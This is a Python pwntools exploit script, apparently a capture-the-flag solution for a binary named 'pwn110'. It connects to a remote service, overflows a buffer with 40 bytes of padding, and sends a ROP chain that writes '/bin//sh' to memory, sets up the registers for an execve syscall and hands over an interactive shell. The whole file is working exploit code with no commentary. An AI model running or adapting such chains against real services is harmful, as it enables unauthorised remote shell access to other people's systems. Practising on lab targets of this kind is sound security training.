#!/usr/bin/python3
# Author: Hack.You
from pwn import *
import sys
import subprocess
from struct import pack


sh = remote('10.10.122.134','9010')
#sh = process('./pwn110.pwn110')

# ROPgadget --binary ./vuln --rop
p = b'a'*(40)
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x00000000004497d7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047bcf5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x000000000040f4de) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000443e30) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012d3) # syscall

sh.sendline(p)

sh.interactive()